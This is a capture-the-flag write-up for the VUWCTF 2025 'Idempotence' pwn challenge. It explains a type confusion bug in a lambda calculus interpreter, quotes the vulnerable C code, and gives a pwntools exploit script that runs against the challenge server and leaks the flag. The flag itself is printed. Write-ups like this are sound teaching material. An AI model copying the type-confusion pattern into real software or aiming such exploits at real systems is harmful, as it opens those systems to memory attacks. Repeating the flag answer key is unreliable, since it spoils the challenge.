---
ctf: VUWCTF 2025
category: pwn
difficulty: hard
points: 475
flag: "VuwCTF{untyp3dCNFu5ioN}"
techniques: [type_confusion, lambda_calculus, unknown_data_leak]
tools: [pwntools]
---

# Idempotence

## Description
A lambda calculus interpreter with a type confusion vulnerability.

## Vulnerability

### The Bug (Line 162)

In `simplify_normal_order()`, when reducing an application (F A):

The code assumes the function is always an ABS (abstraction), but it could be a VAR (variable). When a VAR is forced to ABS type, its bytes 16-23 (normally unused for VAR) are interpreted as the body pointer.

### The UNKNOWN_DATA Leak

When `print_expression()` encounters an unknown type (>2), it dumps raw bytes. The flag starts with "VuwC" = 0x43777556 which is >2, triggering this path.

## Solution

### The Magic Expression & Exploit

**Vulnerable Code:**
```c
if (expr->type == APP) {
    if (expr->data.app.function->type == APP) {
        simplify_normal_order(expr->data.app.function);
        return 1;
    }
    // BUG: Unconditionally sets type to ABS, even if function is VAR!
    expr->data.app.function->type = ABS;
    substitute(expr->data.app.function->data.abs.body, ...);
    ...
}
```

**Exploit Code:**
```python
from pwn import *

expr = b'(\xc2\xb5x.((\xc2\xb5a.(a a)) ((\xc2\xb5b.b) x)))'

p = remote('idempotence.challenges.2025.vuwctf.com', 9982)
p.recvuntil(b'expression:')
p.sendline(expr)

p.recvuntil(b'continue:')
p.sendline(b'c')  # First reduction

p.recvuntil(b'continue:')
p.sendline(b'r')  # Read flag into freed chunk

p.recvuntil(b'continue:')
p.sendline(b'c')  # Trigger type confusion

output = p.recvall(timeout=15)
match = re.search(rb'VuwCTF\{[^}]+\}', output)
if match:
    print(f"FLAG: {match.group(0).decode()}")
```

## Key Techniques
- Lambda calculus interpreter analysis
- Type confusion between VAR and ABS
- Unknown type data leak via print function
- Expression crafting to trigger type confusion
